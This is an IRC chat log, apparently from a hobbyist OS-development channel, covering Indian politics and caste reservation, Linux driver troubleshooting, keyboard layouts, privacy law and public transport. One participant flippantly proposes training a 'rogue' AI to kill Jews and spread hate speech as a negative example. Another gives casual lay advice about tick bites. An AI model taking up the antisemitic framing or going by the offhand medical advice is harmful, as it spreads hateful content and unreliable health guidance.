Jun 13 03:07:53 <S_Gautam>	no, SC/STs are, people from OBC category are not given reservation if they pass a certain economic threshold
Jun 13 03:08:12 <shikhin>	Or are children of privileged government workers, etc.
Jun 13 03:08:12 <S_Gautam>	hm
Jun 13 03:09:51 <S_Gautam>	although to be really honest it's not like the upper castes form a majority of the population so affirmative action doesn't really affect us much practically, but then there are politicians who wish to capitalize on these things
Jun 13 03:10:04 <shikhin>	not?
Jun 13 03:10:32 <S_Gautam>	i think they're 15-16% of the population? let me get a figure

Jun 13 03:14:06 <nortti>	ah
Jun 13 03:14:31 <S_Gautam>	they are not as discriminated as SCs or STs but are historically not in a good social position either
Jun 13 03:16:11 <shikhin>	(scheduled castes, which were the untouchable castes, and scheduled tribes)
Jun 13 03:16:58 <nortti>	right, pretty sure those have come up before
Jun 13 03:17:06 <shikhin>	Ah.
Jun 13 03:20:02 <shikhin>	Anyway, the idea seems to be that people from OBCs are given reservation because of both social & economic oppression (and so being economically privileged is enough to not get any more reservation), but people from SCs/STs are given reservation primarily for social oppression.

Jun 13 21:18:13 <emily>	why don't they take up the job of producing everything?
Jun 13 21:18:36 <emily>	more sreiously, not sure whether you mean R&D or manufacture
Jun 13 21:18:46 <emily>	government directly funding drug R&D is eminently reasonable

Jun 13 21:19:00 *	nanovad . o O ( ~5 because the government fucks everything up )
Jun 13 21:19:33 <sgautam-laptop>	emily, well i think the government should work on manufacturing the most basic necessities
Jun 13 21:20:01 <sgautam-laptop>	so that includes rations, electricity, water, and housing
Jun 13 21:20:23 <nanovad>	Honestly I don't trust the government enough to not mess with that
Jun 13 21:20:29 <nanovad>	any government
Jun 13 21:20:41 <nanovad>	as in, putting things in the water / controlling electricity
Jun 13 21:21:31 <sgautam-laptop>	that's paranoid, i think the governments already take care of controlling electricity and water supply
Jun 13 21:21:37 <sgautam-laptop>	in most places
Jun 13 21:22:18 <sgautam-laptop>	also housing because this would effectively prevent people from living in subhuman conditions like slums, since they would be given housing
Jun 13 21:23:21 <nanovad>	sgautam-laptop: eh, consider if the government becomes oppressive and there's an uprising. Much easier to quell that uprising if you shut off water/electricity, etc
Jun 13 21:24:07 <sprocklem>	Where do you live again?
Jun 13 21:24:17 <sprocklem>	Does the government not already control that?
Jun 13 21:25:10 <nanovad>	Oh I'm in the US, pretty sure the government controls the water for the most part. As for electricity, that's a company (that would probably bow to their will anyway), but I'm not saying I agree with either
Jun 13 21:25:42 <sprocklem>	Ah
Jun 13 21:27:06 <sgautam-laptop>	Yeah, but there are no alternatives. If you rely on companies and corporations to provide these, the poor would be left with nothing.
Jun 13 21:27:25 <sprocklem>	Honestly, if the government becomes oppressive, there's not a ton that could be done anyway imo.
Jun 13 21:27:30 <sgautam-laptop>	yeah
Jun 13 21:27:35 <emily>	sgautam-laptop: why should it manufacture them rather than just subsidising their manufacture?
Jun 13 21:27:38 <emily>	if it wants to drive down cost
Jun 13 21:28:03 <emily>	public housing is a thing! maybe not there, but it is in the UK and many other places
Jun 13 21:28:06 <sgautam-laptop>	how do you subsidize the cost of something you don't produce?
Jun 13 21:28:07 <emily>	and it's a good thing, of course
Jun 13 21:28:42 <sgautam-laptop>	sprocklem, i don't think any internal rebellion is of any use against say, the US army
Jun 13 21:29:04 <emily>	sgautam-laptop: you can give people an n% discount on anything just by paying for it
Jun 13 21:29:24 <emily>	or just throwing money at the manufacturer to manufacture more, etc.
Jun 13 21:29:34 <sgautam-laptop>	oh, so basically buy goods from the corporations and resell it to the poor people
Jun 13 21:29:50 <emily>	well, it's more just arranging things so that the price ends up being one poor people can afford.

Jun 13 22:40:28 <klange>	not generally with itunes
Jun 13 22:41:01 <klange>	You mount the iPad as a USB storage device and it presents some folders for applications, you find the relevant one (eg., iBooks) and dump the PDFs there.

Jun 14 07:25:38 <sgautam-laptop>	So the act was declared unconstitutional
Jun 14 07:27:05 <sgautam-laptop>	"Keeping this framework in mind, let us now turn to Anuj Garg. Anuj Garg concerned a challenge to Section 30 of the Punjab Excise Act, which prohibited the employment of any man under the age of 25, and any woman, in any part of an establishment in which liquor or another intoxicating drug was being consumed. The Court started by taking note of the fact that the Act was a pre-constitutional legislation, passed before the guarantees of sex

If it occurred only in the minds of individuals (as to some degree it already has) it would be powerless. If it came only from the initiative of the state, it would be tyrannical." the most diplomatic thing i've read this week.

Jun 14 11:44:38 <nortti>	okay, what the fuck. the stuckgetting is happening again, even after I turned computer off, left it to cool for >1h, and then turned it back on
Jun 14 11:45:15 <vehk>	What's the load when you watch that?
Jun 14 11:45:42 <nortti>	um, what the fuck. why is my load >2
Jun 14 11:47:17 <nortti>	cpus aren't even running at full speed?
Jun 14 11:47:30 <vehk>	Got htop?
Jun 14 11:47:38 <nortti>	yea
Jun 14 11:47:58 <vehk>	Open it, hit F2, go to Display options -> Detailed CPU time
Jun 14 11:48:02 <vehk>	Check how much of it is on IO-Wait
Jun 14 11:48:15 <vehk>	This sounds like IO anyway
Jun 14 11:48:32 <vehk>	(to find out which color is IO, press h)
Jun 14 11:48:55 <vehk>	You can also look for any processes stuck on IO
Jun 14 11:49:12 <nortti>	very little, most of it is kernel
Jun 14 11:49:34 <nortti>	(also, of fucking course iotop breaks now)
Jun 14 11:49:49 <vehk>	You can enable htop showing kernel threads with K
Jun 14 11:49:52 <vehk>	ie shift-k
Jun 14 11:50:16 <vehk>	Okay, shot in the dark, what does mpv say about the output?
Jun 14 11:50:20 <vehk>	It's not using xv, is it?
Jun 14 11:50:27 <olsner>	could also check dmesg, might show I/O errors from a dying disk or something like that
Jun 14 11:50:29 <nortti>	nope, opengl
Jun 14 11:50:49 <nortti>	kworker/1:2 is rapidly switching between <5 and ~100% of cpu usage
Jun 14 11:50:52 <vehk>	Does CPU use/load go down if you close the video?
Jun 14 11:51:20 <nortti>	not really

Jun 14 11:52:11 <olsner>	hm, now why is perf doing anything? a zombie profiler somewhere?
Jun 14 11:52:57 <nortti>	is there any way to figure out what a "kworker/1:2" is?
Jun 14 11:52:57 <vehk>	Is there any process in D state?
Jun 14 11:53:04 <vehk>	No, not really
Jun 14 11:53:11 <vehk>	Basically that translates to "I'm doing actual IO work"
Jun 14 11:53:15 <vehk>	Somewhere
Jun 14 11:53:25 <nortti>	no, doesn't look like it
Jun 14 11:53:35 <nortti>	only R and S
Jun 14 11:53:51 <vehk>	(well, kworker is system calls, not IO only, obviously)
Jun 14 11:54:02 <vehk>	But if it's hogging, it's usually IO in my experience
Jun 14 11:54:25 <nortti>	IO is only a bar if even that on the cpu monitor
Jun 14 11:54:59 <vehk>	Do you have /proc/sysrq-trigger?
Jun 14 11:55:39 <nortti>	I have the file
Jun 14 11:55:51 <vehk>	If you do, you can generate a backtrace at any time with echo l > /proc/sysrq-trigger
Jun 14 11:56:06 <vehk>	dmesg will have that.
Jun 14 11:56:17 <vehk>	Or you can install perf and record backtraces like that

Jun 14 12:04:39 <vehk>	Let it run for a minute or two (possibly longer)
Jun 14 12:04:43 <vehk>	Then do perf report
Jun 14 12:07:07 <nortti>	on top of it is "58,71%  kworker/1:2      [kernel.kallsyms]                   [k] delay_tsc"

Jun 14 12:15:47 <vehk>	Mh, rmmod could be a good idea (or just pull the ethernet cable)
Jun 14 12:16:03 <nortti>	the problem is, I *am* using wifi here, and there is no ethernet cable I could use
Jun 14 12:16:17 <vehk>	Wait, this is not wired?

Jun 14 12:19:09 <nortti>	(would like to have this fixed before returning to turku, where conversely there is no wifi available and I must use ethernet)
Jun 14 12:19:27 <vehk>	I guess you usually use ethernet then?
Jun 14 12:19:30 <nortti>	yea
Jun 14 12:19:35 <vehk>	Honestly no clue what exactly the issue is here
Jun 14 12:19:45 <vehk>	Could be a driver problem (did you update recently?)
Jun 14 12:20:01 <nortti>	uh, I mean, possibly?
Jun 14 12:20:02 <vehk>	Could also just be something with the link itself (since you are someplace else)
Jun 14 12:20:55 <nortti>	(like I've said, for me updating is like turning on/off the lights, so I'm never sure when I've last updated something)
Jun 14 12:21:01 <vehk>	Ah
Jun 14 12:21:43 <nortti>	but seeing as this did not occur on tuesday, willing to bet I did update it
Jun 14 12:22:12 <vehk>	That's hopefully it. I've seen something like this only once before (where autoneg was seriously broken because I fried my network card by connecting to POE)
Jun 14 12:22:24 <nortti>	welp
Jun 14 12:22:31 <olsner>	it could be that the issue only appears when there's no cable connected, since the function talk about detecting link and stuff
Jun 14 12:22:40 <vehk>	Yeah, that is weird to me too
Jun 14 12:23:01 <nortti>	olsner: but it's been workin fine for several days here without the cable
Jun 14 12:23:20 <vehk>	What did you do to solve the problem?
Jun 14 12:23:28 <nortti>	rmmod e1000e
Jun 14 12:23:48 <vehk>	mmh
Jun 14 12:24:21 <olsner>	if you modprobe it, does it go back to being broken?
Jun 14 12:24:39 <vehk>	And if it then does, does this help: sudo ip l set eth0 down
Jun 14 12:24:47 <vehk>	although I assume it's already down
Jun 14 12:25:34 <olsner>	or if it's ok after modprobe you can probably use rmmod/modprobe when the problem pops up again
Jun 14 12:26:21 <nortti>	no problem after moprobing it back in
Jun 14 12:27:04 <vehk>	Mind posting: ip l
Jun 14 12:27:24 <nortti>	hrm, doesn't include eth0
Jun 14 12:27:35 <vehk>	wha
Jun 14 12:28:50 <nortti>	e1000e is in (can see with lsmod), ip l lists no eth0, attempting to operate on eth0 gives "eth0: ERROR while getting interface flags: No such device"

Jun 14 17:26:30 <bslsk05>	​[The Second Life updater downloaded the updater.exe, ran it with no validation. One day it got a 404. On Win32 if you try to run an EXE, Windows checks if it's a valid format (PE). If it's not it assumes that it's a COM: 16 bit x86 instructions, no header, no validation. The 404 page, read as x86 bytecode, opened the LPT DOS device and wrote garbage into it. On Windows, this would freak out and break cheap printers.]
Jun 14 17:27:34 <asecretcat-web>	i guess the binary image was < 64kB, since windows didn't fail with a not a valid executable error

Jun 15 12:52:39 <vehk>	Sure I can.
Jun 15 12:52:43 <vehk>	john_cephalopoda: I'd say no
Jun 15 12:53:05 <vehk>	It's not really "personal"
Jun 15 12:53:15 <vehk>	(full disclaimer, haven't read the law fully)
Jun 15 12:53:18 <john_cephalopoda>	But an IP is personal?
Jun 15 12:53:37 <vehk>	I think they consider is personal information, yes, although that is sketchy in technical terms as well.
Jun 15 12:53:42 <john_cephalopoda>	It's basically impossible to trace back an IP without the help of the ISP.
Jun 15 12:53:45 <vehk>	It's definitely more personal than time
Jun 15 12:53:56 <vehk>	That doesn't matter, as long as you have the data
Jun 15 12:54:00 <vehk>	Like keeping a log of license plates
Jun 15 12:54:28 <shikhin>	Also you can probably do a lot more if you have the IP along with some more personal information.
Jun 15 12:54:37 <vehk>	Mhm, yes
Jun 15 12:54:53 <john_cephalopoda>	Oooh, .onion sites.
Jun 15 12:55:03 <john_cephalopoda>	IP can't be connected to a person. 
Jun 15 12:55:26 <john_cephalopoda>	In the end it's best to just write the fucking thing and leave it to rot on a subsite that's never updated.
Jun 15 12:55:55 <vehk>	What's going to be on your site?
Jun 15 12:56:21 <john_cephalopoda>	I'll upload some art, some music, link to github etc.
Jun 15 12:56:36 <vehk>	Aha, linking to those Microsoft-controlled pages, I see.
Jun 15 12:56:38 <shikhin>	john_cephalopoda: e.g. if I have a fixed IP and I use it to connect to IRC. (We might have even used this to figure out who is behind the IPs accessing the public logs?)
Jun 15 12:57:28 <john_cephalopoda>	shikhin: Then you'd have to skim IRC though. And when you are really interested in finding out about a person, hit them up on IRC, fall in love with them and move together.
Jun 15 12:58:22 <shikhin>	john_cephalopoda: Sure, just saying that seems pretty much like "personal information" to me.
Jun 15 12:58:51 <john_cephalopoda>	shikhin: True. If you have other data, you can link it together.
Jun 15 13:01:05 <john_cephalopoda>	Hmmmmm...
Jun 15 13:01:51 <john_cephalopoda>	To err is human. You can point at any person who's considered a great example and point out some flawed aspects.
Jun 15 13:02:08 <vehk>	Y-yes. Where is that coming from?
Jun 15 13:02:14 <john_cephalopoda>	Teaching AI with human examples is thereby not really possible.
Jun 15 13:02:28 <vehk>	You're presupposing AI will be or is perfect.
Jun 15 13:02:49 <shikhin>	Or that an AI can't look at human examples and figure out the 'flaws'.
Jun 15 13:02:55 <vehk>	Or that.
Jun 15 13:03:11 <shikhin>	(Just like humans ourselves attempt at doing?)
Jun 15 13:03:15 <vehk>	You could argue that an AI that does not have flaws isn't perfect because of lack of flaws.
Jun 15 13:03:22 <john_cephalopoda>	BUT it's easy to point out those flawed aspects. So what if we taught an AI to kill jews, to do hate speech and to act like Donald Trump and to jump out windows, eat babies, defenestrate vehk etc.
Jun 15 13:03:40 <vehk>	So what if we did that?
Jun 15 13:03:44 <vehk>	I'm not sure what you're getting at
Jun 15 13:03:48 <shikhin>	Me neither.
Jun 15 13:04:08 <john_cephalopoda>	So now we can let the AI decide what it can do in a situation and it will choose the thing that the "rogue" AI will NOT do.
Jun 15 13:04:59 *	shikhin blinks.
Jun 15 13:05:26 <john_cephalopoda>	When there's a baby on the floor, the rogue AI will burn it, eat it, tread on it, poison it, but the rogue AI wouldn't take care of the baby's wellbeing. So the AI choosing what to do will choose "care of the baby's wellbeing" since that's what the rogue AI wouldn't do.

Jun 15 13:08:20 <vehk>	I can see this being "an issue" with POP3, but with IMAP this is just implied
Jun 15 13:08:40 <vehk>	Not to say that it's not reasonable stating this, I'm just amused at the irony
Jun 15 13:09:28 <nortti>	well, I'd guess one'd phrase it as "the mail is merely stored and not processed in any other way"
Jun 15 13:09:35 <vehk>	Mh, right

Jun 16 02:05:00 <S_Gautam>	especially french, it's cool if you know french. 
Jun 16 02:06:15 <S_Gautam>	which is kinda sad because schools are opting to teach European languages (like French, German, etc.) when in all honesty (not there's anything wrong with it) they should teach Indic languages since it's going to be more useful for the average person
Jun 16 02:06:57 <S_Gautam>	like, I don't think I will need French anywhere in my life (unless I visit Paris or a French colony) but say, Marathi and Tamil would definitely be helpful

Jun 16 02:15:03 <S_Gautam>	In school? I don't think so, unless you live in the state where it is spoke. Could study at university, I guess.

Jun 17 11:58:55 <nortti>	yes
Jun 17 11:59:47 <nortti>	the five minute period is mainly meant to encourage others to add it, since before it's as much the lawrememberers' responsibility as anyone else's. otherwise, it'd be more likely that the lawrememberer just adds it

Jun 17 12:35:44 <sortie>	Or at least delegate by law to someone to decide who lawremembers
Jun 17 12:36:05 <nortti>	should we do that for lawspeaker and inner party as well, then?

Jun 17 12:46:18 <nortti>	or, hm, I could see the argument that is has been a matter of new ancient law, and as we no longer create new new ancient laws, it should be codified

Jun 17 13:07:00 <vehk>	Basically what ahti only really can do is be used as encrypted storage
Jun 17 13:07:10 <vehk>	If you want to do stuff with your data, download it and decrypt locally
Jun 17 13:07:10 <zgrep>	Well, if you can find a way to do that... Ignoring stuff like Linux being made by bajillions of people, I guess ahti can implicitly trust that.
Jun 17 13:08:57 <vehk>	Oh, that's what you meant with remote encrypted?

Jun 18 04:11:39 <s_gautam>	shikhin: it's a running joke
Jun 18 04:11:48 <nortti>	is that skinned lxde?
Jun 18 04:11:49 <shikhin>	(hi:gyān = en:knowledge)
Jun 18 04:13:11 <s_gautam>	once my mom commented on my dad talking about politics in she sarcastically said "itna gyaan hota toh PM kyun nahi banjate ho?" (if you have this much knowledge why don't you become PM?) so he decided to name everything gyan and said "Look I have so much gyan"
Jun 18 04:13:19 <shikhin>	"German's® Sweet Chocolate" What.
Jun 18 04:14:01 <s_gautam>	since then it's a convention to name the computer as "gyan"
Jun 18 04:14:06 <s_gautam>	his computer anyway
Jun 18 04:15:56 <s_gautam>	nortti: it's skinned xubuntu
Jun 18 04:16:00 <s_gautam>	xfce, i guess
Jun 18 04:16:23 <s_gautam>	i am reliving the 2004 experience

Jun 18 04:24:10 <s_gautam>	i have been procrastinating to get back into osdev
Jun 18 04:24:38 <s_gautam>	i mean, it just feels like i'm reimplementing shit why do this
Jun 18 04:24:48 <nortti>	what interests you in osdev?
Jun 18 04:26:08 <renopt>	I felt the same way with my unix clone s_gautam 
Jun 18 04:26:19 <shikhin>	My unix clone named s_gautam.
Jun 18 04:26:29 <renopt>	right
Jun 18 04:26:38 <s_gautam>	hm, good question. well, it's interesting to learn about the internals of computers, as well as using something you wrote 
Jun 18 04:27:16 <shikhin>	There's other ways to do both of that things.
Jun 18 04:27:17 <s_gautam>	my current idea is to write a tiny retro-like system to make it easy to build NES-like games, but i pretty much threw it out of the window after getting bored
Jun 18 04:27:51 <nortti>	system as in an OS, or as in sth more like pico8?
Jun 18 04:27:54 <shikhin>	s/that/those/
Jun 18 04:27:54 <bslsk05>	​<shikhin*> There's other ways to do both of those things.
Jun 18 04:28:14 <s_gautam>	nortti: OS running an emulated system
Jun 18 04:28:34 <nortti>	why do you want it to be an OS?
Jun 18 04:29:27 <s_gautam>	hmmm, yeah. I could start off with an emulator
Jun 18 04:29:49 <s_gautam>	then build a tiny OS to run that emulator barebones on x86
Jun 18 04:30:36 <s_gautam>	has this ever been done? i mean people still dos NESDev but the NES is rather limited in what it can do
Jun 18 04:30:42 <s_gautam>	*do
Jun 18 04:31:09 <nortti>	what's "this"? an 'emulator' for a console that doesn't exist? a bootable emulator?
Jun 18 04:31:22 <shikhin>	(Yes to both?)
Jun 18 04:31:41 <nortti>	I know pico8 for former, no idea about latter but would expect there to be some
Jun 18 04:32:01 <s_gautam>	hmm
Jun 18 04:32:06 <s_gautam>	pico8 is interesting
Jun 18 04:32:35 <s_gautam>	wow what
Jun 18 04:32:41 <s_gautam>	PNG as catridiges?
Jun 18 04:33:05 <nortti>	I honestly do not know much about it
Jun 18 04:33:18 <nortti>	btw, the term "fantasy consoles" is sometimes used for such things
Jun 18 04:34:41 <s_gautam>	have you guys ever faced this "i want to write some code but i'm not sure what to do right now?"
Jun 18 04:34:51 <nortti>	yea
Jun 18 04:34:55 <renopt>	no
Jun 18 04:35:32 <nortti>	I solve that by having a five million projects always ongoing, and then ignoring all of them to write some random bullshit like a pure-python reimplementation of the set type that does interning

Jun 18 06:10:01 <nortti>	isn't india also officially sth like that
Jun 18 06:10:21 <john_cephalopoda>	s_gautam: Well, North Korea is named "Democratic People's Republic of Korea".
Jun 18 06:10:33 <s_gautam>	nope, it's Republic of India

Jun 18 06:11:09 <john_cephalopoda>	s_gautam: And the party dictatorship in soviet East Germany was "Deutsche Demokratische Republik" (German Democratic Republic).
Jun 18 06:11:18 <s_gautam>	the "People's" thing makes it weird, i mean i havent seen a true democratic country have that prefix
Jun 18 06:11:32 <s_gautam>	john_cephalopoda: Auferstanden Aus Ruinen
Jun 18 06:11:50 <s_gautam>	that's all i know about the DDR
Jun 18 06:11:50 <john_cephalopoda>	Die Partei hat immer Recht.
Jun 18 06:12:22 <john_cephalopoda>	The DDR was actually quite similar to 1984.
Jun 18 06:12:55 <nortti>	did it try to do the history-editing?
Jun 18 06:13:25 <john_cephalopoda>	They had an organisation called "Stasi" (Staatssicherheit, en:State security), which opened every letter, put microphones into flats of people who were believed to be not as socialist and put many in prison.
Jun 18 06:14:21 <nortti>	right, but that's just your average totalitarian surveilance & police state. what made 1984's society distinct is the editing of history and language to control the thinking of people
Jun 18 06:15:14 <john_cephalopoda>	There's the story of one guy who was quite popular in town but just believed in the wrong things (i.e. not in the party). One day in the evening the police man of the town, who was a good friend of that guy, came to him and told him that he had an order to arrest him, which he had to execute the next day. 
Jun 18 06:15:57 <john_cephalopoda>	nortti: I'm sure that stuff was also done in the DDR. It was soviet and the soviet Russians did that all the time.

Jun 18 06:18:16 <s_gautam>	nortti: well, if you want to win elections in india you have to be socialist no matter what western-styled political side you are on
Jun 18 06:18:27 <s_gautam>	(left/right)
Jun 18 06:19:39 <nortti>	what is your understanding of "to be a socialist"?
Jun 18 06:21:05 <s_gautam>	state subsidizing basic necessities, such as healthcare and education and redistribution of wealth among the classes
Jun 18 06:22:02 <s_gautam>	(through heavy taxation of the rich as well as charging proportionately for services as per income)
Jun 18 06:22:29 <nortti>	sounds more like social democracy for me
Jun 18 06:23:33 <john_cephalopoda>	nortti: Except when you are in the USA, there it's socialism. :þ
Jun 18 06:23:46 <john_cephalopoda>	Bernie Sanders, the socialist :D
Jun 18 06:23:47 <s_gautam>	hm that might be correct
Jun 18 06:23:59 <s_gautam>	i guess it's only the US where such confusion is left/right
Jun 18 06:24:01 <nortti>	john_cephalopoda: socialism is when the government does anything™
Jun 18 06:24:24 <john_cephalopoda>	nortti: Does Trump does anything™?
Jun 18 06:24:56 <john_cephalopoda>	Wows, myself gramar does beings verily goods todays.
Jun 18 06:26:25 <s_gautam>	other than anti-immigration policies what does the European right want
Jun 18 06:26:49 <nortti>	depends on the party
Jun 18 06:27:15 <nortti>	many honestly don't have any other real platform than racism
Jun 18 06:28:43 <s_gautam>	do european countries have non-uniform civil laws?
Jun 18 06:28:50 <nortti>	in here for the longest time the right-wing populist party did have the "<workers' party without socialism>" thing it tried to do, trying to get people affected by the dismantling of the welfare state to it. then it split after an open white supremacist was elected party leader, and now one is white supremacy, the party and other is fuck if I know, the party
Jun 18 06:29:00 <nortti>	how do you mean?
Jun 18 06:29:44 <nortti>	as in, do the laws of one contry differ from the next? yes, a lot
Jun 18 06:29:49 <s_gautam>	no no no
Jun 18 06:30:01 <s_gautam>	as in, like different religion followers have different personal laws
Jun 18 06:30:07 <nortti>	oh, nope
Jun 18 06:31:51 <john_cephalopoda>	There are some smaller laws that make exceptions for followers of specific religions.
Jun 18 06:33:07 <nortti>	right. like how jehova's witnesses are except from military conscription here
Jun 18 06:33:19 <s_gautam>	hm i see
Jun 18 06:34:47 <s_gautam>	one of the reasons why people became opposed to it was indian islamic law allows divorce with the husband saying talaq (en:divorce) thrice, but it is also put in favour since it's feared that if a uniform civil law is implemented it would favour hindus
Jun 18 06:35:19 <nortti>	mh
Jun 18 06:35:56 <nortti>	how are situations where both a hindu and a muslim are involved handled?
Jun 18 06:36:28 <s_gautam>	yes, they come under another act
Jun 18 06:38:19 <s_gautam>	well, except Jammu and Kashmir? what

Jun 18 09:46:36 <olsner>	I ought to fix this somehow... is there a key combo you can use to change layout on both linux, windows and mac?
Jun 18 09:48:04 <olsner>	as it is now, I use Caps Lock on Linux, alt-shift on windows and ctrl-space on mac (the latter two are madness when also using windows-on-mac, since alt-shift-arrow is moving by word on mac and ctrl-space is intellisense on windows)
Jun 18 09:48:36 <nanovad>	I use Win+Space on Linux, Alt+Space on Linux
Jun 18 09:48:38 <nanovad>	er
Jun 18 09:48:48 <vehk>	I thought the Windows default was win+space, but you can definiteluy make Linux behave like Windows
Jun 18 09:48:51 <nanovad>	Win+Space on both Windows and Linux
Jun 18 09:48:57 <nanovad>	Alt+Space is tiling layout
Jun 18 09:49:06 <vehk>	See man xkeyboard-config
Jun 18 09:49:10 <vehk>	Search for "grp:"
Jun 18 09:49:23 <vehk>	And then set your layout with setxkbmap and that option
Jun 18 09:49:41 <vehk>	for example setxkbmap us -option grp:alt_shift_toggle
Jun 18 09:49:44 <vehk>	Mac, no clue
Jun 18 09:49:57 *	nanovad . o O ( On a Mac, change the OS )
Jun 18 09:50:24 <olsner>	looks like the only possible options on windows is ctrl+shift, alt+shift or grave accent
Jun 18 09:50:40 <vehk>	Is that 7, 8, 10?
Jun 18 09:50:44 <olsner>	10
Jun 18 09:50:52 <vehk>	Weird... I swear the default is Win+Space
Jun 18 09:51:30 <olsner>	huh, win+space does seem to work too
Jun 18 09:51:35 <olsner>	it's just not possible to set?
Jun 18 09:51:43 <vehk>	Apparently not? I'm looking right now
Jun 18 09:51:54 <vehk>	Oh, no, you can
Jun 18 09:53:01 <vehk>	Go to the Language Settings -> Advanced keyboard settings -> Language bar options -> Advanced Key Settings
Jun 18 09:53:37 <olsner>	I think that's where I was
Jun 18 09:53:43 <vehk>	oh well, that only has those options, yeah
Jun 18 09:55:21 <olsner>	win+space is slightly different though, as it pops up the language choice menu too, using the hotkey from the settings only switches
Jun 18 09:55:30 <vehk>	Oh, I see
Jun 18 09:55:33 <vehk>	Right, yeah
Jun 18 10:00:40 <olsner>	ooh, managed to enable per-application layouts too, now that I found that settings screen
Jun 18 10:00:54 <vehk>	Huh, you actually use that?
Jun 18 10:01:06 <vehk>	It was changed to default-off in Windows 10, and I welcomed that greatly
Jun 18 10:01:13 <vehk>	Previous versions all had that enabled
Jun 18 10:01:32 <vehk>	But that settings screen is hidden way too well
Jun 18 10:01:55 <olsner>	oh yes, it's like 4 levels of "Advanced settings" deep
Jun 18 10:02:13 <vehk>	I think you can reach it via the control panel as well
Jun 18 10:02:18 <olsner>	seems to be slightly more accessible if you first manage to find the classical control panel
Jun 18 10:02:24 <vehk>	Yeah
Jun 18 10:05:19 <olsner>	I tend to use per-application keyboard layouts, and then switch all the time because it's wrong anyway
Jun 18 10:05:27 <vehk>	heh
Jun 18 10:08:14 <olsner>	maybe I should just start writing swedish with [';{": instead of åäöÅÄÖ
Jun 18 10:08:16 <vehk>	Does Mac let you change the binding?
Jun 18 10:08:36 <vehk>	Mh, have you considered setting an international version of your default layout?
Jun 18 10:09:11 <vehk>	For example, I have äöü available by hitting alt-{q;y}
Jun 18 10:09:58 <vehk>	å is alt-w
Jun 18 10:10:06 <olsner>	I don't have my mac here, iirc it has a few options but they are all wrong
Jun 18 10:10:12 <vehk>	Pretty sure those are the default us-intl bindings
Jun 18 10:12:26 <vehk>	Then again, I only need äüö for German, and nothing else
Jun 18 10:16:55 <olsner>	now, how to set up this keyboard to have a right alt key
Jun 18 10:21:05 <vehk>	It doesn't physically have one?
Jun 18 10:21:32 <olsner>	it can have one if you flip some dip switches and lose the context menu key
Jun 18 10:21:37 <vehk>	I see
Jun 18 10:22:39 <olsner>	and then the keys won't match the key caps (they're supposedly removable, but they're stuck harder than the removal tool was stuck together)
Jun 18 10:23:09 <olsner>	the more I think about it, there's just about nothing of my entire computing environment that works right
Jun 18 10:25:35 <nanovad>	:D:
Jun 18 10:31:17 <olsner>	oh, neat, hexchat on windows seems to break us-intl
Jun 18 10:32:08 <vehk>	D:
Jun 18 10:32:09 <vehk>	How so?
Jun 18 10:32:25 <olsner>	or no, it was just perhaps using an old layout from before I changed it to us-intl
Jun 18 10:34:53 <olsner>	so now I can use åäöÅÄÖ without switching layouts but I have to retrain myself since the key combo for home/end and arrows etc has moved...
Jun 18 10:35:03 <vehk>	Yeah, that is one downside, definitely

Jun 18 12:32:48 <nortti>	shikhin: are indian busses as filled-to-brim as the trains?
Jun 18 12:32:55 <shikhin>	Yes.
Jun 18 12:33:57 <shikhin>	(Although the newer expensive busses with air conditioning aren't as full for obvious reasons.)
Jun 18 12:34:29 <nortti>	…the reasons aren't that obvious to me? surely those busses would be more, not less, popular?

Jun 18 12:34:48 <nortti>	cost more money to use?
Jun 18 12:34:51 <shikhin>	Both the busses themselves and the fares are expensive, sorry.
Jun 18 12:34:54 <olsner>	"the air conditioning on our premium buses continuously filters out any unwanted persons"
Jun 18 12:35:15 <nortti>	you have different classes of busses with different fares, wow
Jun 18 12:35:44 <shikhin>	Not all popular busses are run by the state, at least in Delhi, even.
Jun 18 12:36:04 <shikhin>	(Or maybe that's not that surprising for you? Surprising for me.)
Jun 18 12:37:49 <nortti>	okay, so I've only ever used the busses in oulu (turku is too tightly packed for me to justify not bicycling), but my understanding is that busses are generally run by companies that are more or less controlled by the municipiality, in finland
Jun 18 12:38:57 <nortti>	"<Buy Oulu Public Transport [that's what he company in Oulu is called, nowadays] – Microsoft Store fi-FI>"
Jun 18 12:38:57 <olsner>	long distance buses are all privately run here, public transport only goes within one county or so (and there's generally no alternative local transport)

Jun 18 12:41:02 <nortti>	right, same here as with olsner, long-distance busses are split between matkahuolto umbrella (a lot of smaller regional operators that I guess have some agreement) and onnibus, mostly
Jun 18 12:41:38 <shikhin>	Both of those are run by the state government, but there's also a large amount of busses for schools and offices that look fairly similar (in condition & crowd) to the older busses I linked but are privately run.
Jun 18 12:42:08 <nortti>	mh
Jun 18 12:42:27 <shikhin>	Not much of an idea about long distance busses, but I only know of private operators.

Jun 19 10:32:33 <shikhin>	Don't have any symptoms / rashes / itches, but is it recommended to still go see a doctor (and possibly get antibiotics for lyme disease or something)?
Jun 19 10:33:11 <S_Gautam>	prevention > cure
Jun 19 10:33:19 <S_Gautam>	just go man
Jun 19 10:33:51 <shikhin>	Not going to a doctor here in any case, will wait for my return to the US (in a week).
Jun 19 10:34:10 <S_Gautam>	there are no good doctors in Delhi?
Jun 19 10:34:17 <shikhin>	:P
Jun 19 10:34:49 <S_Gautam>	no no like serious?
Jun 19 10:34:59 <S_Gautam>	i have honestly never been to delhi more than 1-2 days
Jun 19 10:35:31 <shikhin>	Depends, if you think there's no good doctors in Delhi, you'd probably think there's no good doctors in the entire country.
Jun 19 10:35:38 <shikhin>	Anyway, pretty sure doctors here err more on the side of overprescribing than "no need for any drugs right now".
Jun 19 10:35:57 <shikhin>	And I'd trust doctors in the US to be more aware about diseases carried by ticks since it's an actual issue there (and not one in India).

Jun 19 10:38:46 <S_Gautam>	People have to wait for weeks to get an appointment for free healthcare, some even die while they are waiting for the notice. Fucking disgusting
Jun 19 10:39:21 <shikhin>	Delhi's pretty good in that aspect.
Jun 19 10:39:49 <shikhin>	e.g. if you don't get a reasonable date at a government hospital, you can get treatment from a private one and the government will pay for it (or reimburse it? not sure of the details).
Jun 19 10:40:01 <shikhin>	(Then there's the mohalla clinics and whatnot.)
Jun 19 10:40:40 <S_Gautam>	Whoa, that sounds good.
Jun 19 10:40:57 <shikhin>	Yay AAP government actually doing some useful things.
Jun 19 10:41:08 <S_Gautam>	I mean, the only AIIMS I've seen was AIIMS Patna
Jun 19 10:41:43 <shikhin>	(When I said "* shikhin looks at AIIMS," I specifically meant AIIMS, Delhi––was justifying my "if no good doctors in Delhi, then no good doctors in India" remark.)
Jun 19 10:45:51 <olsner>	I wouldn't bother unless there are symptoms - lyme's disease iirc produces a red ring at a couple of cm radius around the bite
